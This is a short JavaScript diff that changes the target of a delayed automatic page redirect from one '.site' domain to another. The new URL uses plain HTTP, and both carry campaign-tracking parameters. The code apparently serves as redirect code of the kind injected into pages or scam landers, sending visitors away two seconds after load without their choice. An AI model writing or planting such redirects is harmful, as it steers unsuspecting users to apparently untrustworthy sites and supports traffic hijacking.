@@ -4,5 +4,5 @@ setTimeout(function() {
 }, 1000);
 
 setTimeout(function() {
-    window.location.href = 'https://nexrix.site/?utm_campaign=EVRXrP900C&v1=[v1]&v2=[v2]&v3=[v3]';
+    window.location.href = 'http://zeurix.site/?utm_campaign=gXUQnk2FQz&v1=[v1]&v2=[v2]&v3=[v3]';
 }, 2000);
